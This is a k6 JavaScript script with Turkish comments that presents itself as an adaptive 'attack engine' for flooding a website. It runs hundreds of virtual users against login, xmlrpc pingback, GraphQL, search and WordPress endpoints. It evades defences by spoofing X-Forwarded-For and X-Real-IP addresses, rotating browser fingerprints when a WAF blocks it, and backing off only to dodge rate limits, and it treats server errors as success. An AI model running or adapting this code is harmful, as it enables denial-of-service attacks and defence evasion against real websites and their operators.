// ================================================================
// 🧠 k6 ADAPTIVE — Akıllı Saldırı Motoru
//
// STRATEJİ:
//   Response code'ları izler ve saldırı davranışını dinamik ayarlar:
//
//   • 200-299 alıyorsa    → HIZLAN, endpoint çalışıyor
//   • 429 (rate limit)     → GERİ ÇEKİL, IP rotasyonu + jitter
//   • 403 (WAF)            → HEADER DEĞİŞTİR, fingerprint rotate
//   • 500-599              → HEDEF YIKILIYOR, sabit RPS koru
//   • 502/503/504          → 3 saniye bekle, tekrar dene
//   • timeout              → connection'ı düşür, yeni yap
//
//   Her VU kendi state'ini tutar:
//     - success streak
//     - fail streak
//     - preferred endpoint (başarılı olanı tekrar dene)
//     - back-off delay
//
// ENV: TARGET_URL, DURATION, VUS, BOT_ID, HOST_HEADER
// ================================================================

import http from 'k6/http';
import { check, sleep } from 'k6';
import exec from 'k6/execution';
import { Counter, Trend, Rate, Gauge } from 'k6/metrics';
import { randomIntBetween, randomString, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

const TARGET_URL = (__ENV.TARGET_URL || 'https://hhh.frostai.com.tr').replace(/\/$/, '');
const BOT_ID = __ENV.BOT_ID || '0';
const HOST_HEADER = __ENV.HOST_HEADER || '';
const DURATION = __ENV.DURATION || '3m';
const VUS = parseInt(__ENV.VUS || '300', 10);

// Metrics
const adaptations = new Counter('adaptive_adaptations');
const backoffs = new Counter('adaptive_backoffs');
const wafBlocks = new Counter('adaptive_waf_blocks');
const successStreaks = new Trend('adaptive_success_streak');
const rate2xx = new Rate('rate_2xx');
const rate4xx = new Rate('rate_4xx');
const rate5xx = new Rate('rate_5xx');
const rate429 = new Rate('rate_429');
const rate403 = new Rate('rate_403');
const currentDelay = new Gauge('adaptive_current_delay_ms');

// Endpoint pool — hem GET hem POST, çeşitli
const ENDPOINTS = [
    { path: '/', method: 'GET', weight: 5 },
    { path: '/search?q=', method: 'GET', weight: 12, dynamic: true },
    { path: '/?s=', method: 'GET', weight: 10, dynamic: true },
    { path: '/wp-login.php', method: 'GET', weight: 8 },
    { path: '/wp-json/wp/v2/posts', method: 'GET', weight: 8 },
    { path: '/xmlrpc.php', method: 'POST', weight: 8, bodyType: 'xmlrpc' },
    { path: '/api/search', method: 'POST', weight: 10, bodyType: 'search' },
    { path: '/api/login', method: 'POST', weight: 8, bodyType: 'login' },
    { path: '/api/v1/users', method: 'GET', weight: 6 },
    { path: '/graphql', method: 'POST', weight: 8, bodyType: 'graphql' },
    { path: '/product/', method: 'GET', weight: 8, appendId: true },
    { path: '/user/', method: 'GET', weight: 6, appendId: true },
    { path: '/category/', method: 'GET', weight: 6, appendSlug: true },
    { path: '/api/products', method: 'GET', weight: 6, dynamic: true, qkey: '?id=' },
    { path: '/api/v1/', method: 'GET', weight: 6, appendRandom: true }
];

const totalWeight = ENDPOINTS.reduce((s, e) => s + e.weight, 0);

// Fingerprint pool
const FINGERPRINTS = [
    {
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        platform: '"Windows"', mobile: '?0'
    },
    {
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        secChUa: '"Google Chrome";v="121", "Chromium";v="121"',
        platform: '"macOS"', mobile: '?0'
    },
    {
        ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        secChUa: '"Chromium";v="122"',
        platform: '"Linux"', mobile: '?0'
    },
    {
        ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        secChUa: null, platform: null, mobile: null
    },
    {
        ua: 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        secChUa: '"Google Chrome";v="120"', platform: '"Android"', mobile: '?1'
    },
    {
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        secChUa: null, platform: null, mobile: null
    }
];

const REFERRERS = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
    'https://twitter.com/', 'https://facebook.com/', 'https://reddit.com/', ''
];

function randomIP() {
    const a = randomIntBetween(1, 223);
    if (a === 10 || a === 127 || a === 172 || a === 192) return randomIP();
    return `${a}.${randomIntBetween(0, 255)}.${randomIntBetween(0, 255)}.${randomIntBetween(1, 254)}`;
}

function pickEndpoint(state) {
    // Success streak > 5 ise, son başarılı endpoint'i tekrar dene (%40 şansla)
    if (state.lastSuccessEndpoint && state.successStreak > 5 && Math.random() < 0.4) {
        return state.lastSuccessEndpoint;
    }
    const r = Math.random() * totalWeight;
    let acc = 0;
    for (const e of ENDPOINTS) {
        acc += e.weight;
        if (r < acc) return e;
    }
    return ENDPOINTS[0];
}

function buildURL(endpoint) {
    let path = endpoint.path;
    if (endpoint.dynamic) {
        path += randomString(randomIntBetween(6, 16));
    } else if (endpoint.appendId) {
        path += randomIntBetween(1, 999999);
    } else if (endpoint.appendSlug) {
        path += randomString(randomIntBetween(6, 12), 'abcdefghijklmnopqrstuvwxyz-');
    } else if (endpoint.appendRandom) {
        path += randomString(randomIntBetween(6, 12));
    }
    // Cache buster
    const sep = path.includes('?') ? '&' : '?';
    path += `${sep}_=${randomString(8)}`;
    return TARGET_URL + path;
}

function buildBody(endpoint) {
    switch (endpoint.bodyType) {
        case 'login':
            return JSON.stringify({
                username: randomString(10),
                password: randomString(16),
                csrf: randomString(32)
            });
        case 'search':
            return JSON.stringify({
                query: randomString(15),
                page: randomIntBetween(1, 100),
                per_page: 100,
                filters: { cat: randomIntBetween(1, 100) }
            });
        case 'graphql':
            return JSON.stringify({
                query: `query { users(limit: 50) { id name posts(limit: 20) { id title comments(limit: 10) { id } } } }`
            });
        case 'xmlrpc':
            return `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://${randomString(10)}.com/</string></value></param></params></methodCall>`;
        default:
            return JSON.stringify({ data: randomString(200) });
    }
}

function buildHeaders(fp, state, endpoint) {
    const h = {
        'User-Agent': fp.ua,
        'Accept': endpoint.method === 'POST'
            ? 'application/json, text/plain, */*'
            : 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        'Accept-Language': randomItem(['tr-TR,tr;q=0.9', 'en-US,en;q=0.9', 'en-GB,en;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': state.currentIP,  // WAF block olursa değişir
        'X-Real-IP': state.currentIP,
        'DNT': Math.random() > 0.5 ? '1' : '0'
    };

    if (fp.secChUa) {
        h['sec-ch-ua'] = fp.secChUa;
        h['sec-ch-ua-mobile'] = fp.mobile;
        h['sec-ch-ua-platform'] = fp.platform;
    }

    if (endpoint.method === 'POST') {
        h['Content-Type'] = endpoint.bodyType === 'xmlrpc' ? 'text/xml' : 'application/json';
        h['Sec-Fetch-Dest'] = 'empty';
        h['Sec-Fetch-Mode'] = 'cors';
        h['Sec-Fetch-Site'] = 'same-origin';
        h['Origin'] = TARGET_URL;
    } else {
        h['Sec-Fetch-Dest'] = 'document';
        h['Sec-Fetch-Mode'] = 'navigate';
        h['Sec-Fetch-Site'] = 'none';
        h['Upgrade-Insecure-Requests'] = '1';
    }

    const ref = randomItem(REFERRERS);
    if (ref) h['Referer'] = ref;

    if (HOST_HEADER) h['Host'] = HOST_HEADER;

    return h;
}

export const options = {
    scenarios: {
        adaptive: {
            executor: 'ramping-vus',
            startVUs: Math.floor(VUS / 4),
            stages: [
                { duration: '15s', target: VUS },        // ramp up
                { duration: DURATION, target: VUS * 2 }, // sustained max
                { duration: '10s', target: 0 }           // wind down
            ],
            gracefulRampDown: '10s'
        }
    },
    discardResponseBodies: false,
    batch: 20,
    batchPerHost: 20,
    insecureSkipTLSVerify: true,
    userAgent: '',
    tlsVersion: { min: 'tls1.2', max: 'tls1.3' },
    summaryTrendStats: ['avg', 'min', 'med', 'max', 'p(90)', 'p(95)', 'p(99)'],
    thresholds: { 'http_reqs': ['count>=0'] }
};

export function setup() {
    console.log(`═══════════════════════════════════════`);
    console.log(`  BOT #${BOT_ID} — ADAPTIVE ENGINE`);
    console.log(`  Target : ${TARGET_URL}`);
    console.log(`  Strategy: Response-aware auto-tuning`);
    console.log(`═══════════════════════════════════════`);
}

// ================================================================
// VU STATE — her VU kendi context'ini korur
// ================================================================
let vuState = null;
function initState() {
    return {
        successStreak: 0,
        failStreak: 0,
        wafHits: 0,
        rateLimitHits: 0,
        currentDelayMs: 0,
        currentIP: randomIP(),
        currentFP: randomItem(FINGERPRINTS),
        lastSuccessEndpoint: null,
        totalRequests: 0
    };
}

// ---- LIVE PROGRESS LOGGER ----
let __lastProgressLog = 0;
let __localReqs = 0;
let __local2xx = 0;
let __local5xx = 0;
let __local429 = 0;
let __local403 = 0;
let __localAdapts = 0;

function logProgress(res, state) {
    __localReqs++;
    if (res.status >= 200 && res.status < 300) __local2xx++;
    else if (res.status >= 500) __local5xx++;
    else if (res.status === 429) __local429++;
    else if (res.status === 403) __local403++;

    if (exec.vu.idInTest !== 1) return;
    const now = Date.now();
    if (now - __lastProgressLog < 5000) return;
    __lastProgressLog = now;

    const elapsed = Math.floor(exec.instance.currentTestRunDuration / 1000);
    const vusActive = exec.instance.vusActive || 0;
    const iters = exec.instance.iterationsCompleted || __localReqs;
    const rps = elapsed > 0 ? Math.floor(iters / elapsed) : 0;
    const pct2xx = __localReqs > 0 ? Math.floor((__local2xx / __localReqs) * 100) : 0;
    const pct5xx = __localReqs > 0 ? Math.floor((__local5xx / __localReqs) * 100) : 0;
    const pct429 = __localReqs > 0 ? Math.floor((__local429 / __localReqs) * 100) : 0;
    const pct403 = __localReqs > 0 ? Math.floor((__local403 / __localReqs) * 100) : 0;

    console.log(`[LIVE bot=${BOT_ID}] ADAPT | t=${elapsed}s | iters=${iters} | vus=${vusActive} | rps~${rps} | 2xx=${pct2xx}% 5xx=${pct5xx}% 429=${pct429}% 403=${pct403}% | delay=${state.currentDelayMs}ms | last=${res.status}`);
}

export default function () {
    if (!vuState) vuState = initState();
    const state = vuState;

    const endpoint = pickEndpoint(state);
    const url = buildURL(endpoint);
    const headers = buildHeaders(state.currentFP, state, endpoint);

    const params = {
        headers: headers,
        timeout: '20s',
        tags: { endpoint_type: endpoint.path.split('?')[0], method: endpoint.method },
        redirects: 3
    };

    let res;
    if (endpoint.method === 'POST') {
        res = http.post(url, buildBody(endpoint), params);
    } else {
        res = http.get(url, params);
    }

    state.totalRequests++;

    // Metric update
    rate2xx.add(res.status >= 200 && res.status < 300);
    rate4xx.add(res.status >= 400 && res.status < 500);
    rate5xx.add(res.status >= 500);
    rate429.add(res.status === 429);
    rate403.add(res.status === 403);

    // ============================================================
    // ADAPTIVE LOGIC
    // ============================================================

    if (res.status >= 200 && res.status < 400) {
        // BAŞARILI — hızlan
        state.successStreak++;
        state.failStreak = 0;
        state.lastSuccessEndpoint = endpoint;

        // Delay'i azalt
        if (state.currentDelayMs > 0) {
            state.currentDelayMs = Math.max(0, state.currentDelayMs - 50);
            adaptations.add(1);
        }
        successStreaks.add(state.successStreak);

    } else if (res.status === 429) {
        // RATE LIMIT — geri çekil + IP rotate
        state.rateLimitHits++;
        state.successStreak = 0;
        state.failStreak++;

        // Exponential backoff (max 5 saniye)
        state.currentDelayMs = Math.min(5000, (state.currentDelayMs || 100) * 2);
        state.currentIP = randomIP();
        backoffs.add(1);
        adaptations.add(1);

    } else if (res.status === 403) {
        // WAF BLOK — fingerprint değiştir
        state.wafHits++;
        state.currentFP = randomItem(FINGERPRINTS);
        state.currentIP = randomIP();
        state.currentDelayMs = randomIntBetween(200, 1000);
        wafBlocks.add(1);
        adaptations.add(1);

    } else if (res.status >= 500 && res.status < 600) {
        // SERVER YIKILIYOR — sabit tut, biraz bekle (kendine gel)
        state.successStreak = 0;
        state.failStreak++;
        if (res.status === 502 || res.status === 503 || res.status === 504) {
            state.currentDelayMs = randomIntBetween(500, 2000);
        }
        // 500 alıyorsak = başarı sayılır (site zorlanıyor demek)
        state.lastSuccessEndpoint = endpoint;

    } else if (res.status === 0) {
        // TIMEOUT / connection error — connection'ı düşür
        state.failStreak++;
        state.currentDelayMs = randomIntBetween(300, 1500);
        state.currentIP = randomIP();
    }

    currentDelay.add(state.currentDelayMs);

    // Delay uygula
    if (state.currentDelayMs > 0) {
        sleep(state.currentDelayMs / 1000);
    }

    // Her 50 istekte bir IP'yi refresh et (uzun testlerde çeşitlilik)
    if (state.totalRequests % 50 === 0) {
        state.currentIP = randomIP();
    }
    // Her 200 istekte bir fingerprint rotate
    if (state.totalRequests % 200 === 0) {
        state.currentFP = randomItem(FINGERPRINTS);
    }

    check(res, {
        'not blocked (200-499 or 5xx)': (r) => r.status !== 0
    });

    logProgress(res, state);
}

export function handleSummary(data) {
    const m = data.metrics;
    const reqs = m.http_reqs ? (m.http_reqs.values.count || 0) : 0;
    const bytes = m.data_received ? (m.data_received.values.count || 0) : 0;
    const adapts = m.adaptive_adaptations ? (m.adaptive_adaptations.values.count || 0) : 0;
    const boffs = m.adaptive_backoffs ? (m.adaptive_backoffs.values.count || 0) : 0;
    const wafs = m.adaptive_waf_blocks ? (m.adaptive_waf_blocks.values.count || 0) : 0;
    const failed = m.http_req_failed ? (m.http_req_failed.values.rate || 0) : 0;
    const p50 = m.http_req_duration ? (m.http_req_duration.values.med || 0) : 0;
    const p95 = m.http_req_duration ? (m.http_req_duration.values['p(95)'] || 0) : 0;
    const p99 = m.http_req_duration ? (m.http_req_duration.values['p(99)'] || 0) : 0;
    const r2xx = m.rate_2xx ? (m.rate_2xx.values.rate * 100).toFixed(1) : '0.0';
    const r4xx = m.rate_4xx ? (m.rate_4xx.values.rate * 100).toFixed(1) : '0.0';
    const r5xx = m.rate_5xx ? (m.rate_5xx.values.rate * 100).toFixed(1) : '0.0';
    const r429 = m.rate_429 ? (m.rate_429.values.rate * 100).toFixed(1) : '0.0';
    const r403 = m.rate_403 ? (m.rate_403.values.rate * 100).toFixed(1) : '0.0';

    const summary =
        `═══════════════════════════════════════════════════
  BOT #${BOT_ID} — ADAPTIVE ENGINE SUMMARY
═══════════════════════════════════════════════════
  Toplam istek     : ${reqs}
  Veri             : ${(bytes / 1024 / 1024).toFixed(2)} MB
  Hata oranı       : ${(failed * 100).toFixed(2)}%
  ---------------------------------------------------
  Response Dist:
    2xx (başarı)   : ${r2xx}%
    4xx (client)   : ${r4xx}%
    5xx (server)   : ${r5xx}%
    429 (rate lim) : ${r429}%
    403 (WAF blk)  : ${r403}%
  ---------------------------------------------------
  Adaptasyonlar    : ${adapts}
  Backoff sayısı   : ${boffs}
  WAF blokları     : ${wafs}
  ---------------------------------------------------
  Response p50     : ${p50.toFixed(0)}ms
  Response p95     : ${p95.toFixed(0)}ms
  Response p99     : ${p99.toFixed(0)}ms
═══════════════════════════════════════════════════
`;

    const result = {};
    result['stdout'] = summary;
    result[`reports/bot-${BOT_ID}-summary.json`] = JSON.stringify(data);
    return result;
}